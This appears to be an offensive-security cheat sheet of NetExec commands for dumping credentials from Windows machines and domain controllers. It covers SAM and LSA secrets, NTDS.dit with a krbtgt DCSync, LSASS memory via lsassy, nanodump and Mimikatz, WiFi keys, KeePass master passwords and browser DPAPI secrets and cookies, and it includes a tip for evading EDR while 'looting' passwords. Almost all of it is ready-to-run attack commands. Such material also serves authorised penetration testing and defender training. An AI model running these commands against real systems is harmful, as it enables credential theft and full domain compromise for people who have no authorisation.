# Credentials Dumping

### The following examples use a username and plaintext password although user/hash combos work as well.

# Dump SAM

## Dump SAM hashes using methods from secretsdump.py

## You need at least local admin privilege on the remote target, use option --local-auth if your user is a local account

#### #~ nxc smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --sam

# Dump LSA

## Dump LSA secrets using methods from secretsdump.py

## Requires Domain Admin or Local Admin Priviledges on target Domain Controller!

#### #~ nxc smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --lsa

# Dump NTDS.dit

## Requires Domain Admin or Local Admin Priviledges on target Domain Controller

## 2 methods are available:   

#### (default) 	drsuapi -  Uses drsuapi RPC interface create a handle, trigger replication, and combined with additional drsuapi calls to convert the resultant linked-lists into readable format  

#### vss - Uses the Volume Shadow copy Service  

---------------------------------------------------------------------------

#### #~ nxc smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds

#### #~ nxc smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds --users

#### #~ nxc smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds --users --enabled

#### #~ nxc smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds vss

## TIP: You can also DCSYNC with the computer account of the DC

### There is also the ntdsutil module that will use ntdsutil to dump NTDS.dit and SYSTEM hive and parse them locally with secretsdump.py 

#### #~ nxc smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' -M ntdsutil

# Dump LSASS

## You need at least local admin privilege on the remote target, use option --local-auth if your user is a local account

## Using Lsassy

### Using the module Lsassy from @pixis you can dump remotely the credentials

#### #~ nxc smb 192.168.255.131 -u administrator -p pass -M lsassy

## Using nanodump

### Using the module nanodump you can dump remotely the credentials

#### #~ nxc smb 192.168.255.131 -u administrator -p pass -M nanodump

## Using Mimikatz (Deprecated)

## You need at least local admin privilege on the remote target, use option --local-auth if your user is a local account

### Using the module Mimikatz, the powershell script Invoke-mimikatz.ps1 will be executed on the remote target

#### #~ nxc smb 192.168.255.131 -u administrator -p pass -M mimikatz

#### #~ nxc smb 192.168.255.131 -u Administrator -p pass -M mimikatz -o COMMAND='"lsadump::dcsync /domain:domain.local /user:krbtgt"

# Dump WiFi password

## You need at least local admin privilege on the remote target, use option --local-auth if your user is a local account

### Get the WIFI password register in Windows

#### nxc smb <ip> -u user -p pass -M wireless

# Dump KeePass

### You can check if keepass is installed on the target computer and then steal the master password and decrypt the database!

#### $ NetExec smb <ip> -u user -p pass -M keepass_discover

#### $ NetExec smb <ip> -u user -p pass -M keepass_trigger -o KEEPASS_CONFIG_PATH="path_from_module_discovery"

# Dump DPAPI

### You can dump DPAPI credentials using NetExec using the following option --dpapi. It will get all secrets from Credential Manager, Chrome, Edge, Firefox. --dpapi support options : 

 - cookies: Collect every cookies in browsers

 - nosystem: Won't collect system credentials. This will prevent EDR from stopping you from looting passwords

## You need at least local admin privilege on the remote target, use option --local-auth if your user is a local account

#### $ nxc smb <ip> -u user -p password --dpapi

#### $ nxc smb <ip> -u user -p password --dpapi cookies

#### $ nxc smb <ip> -u user -p password --dpapi nosystem

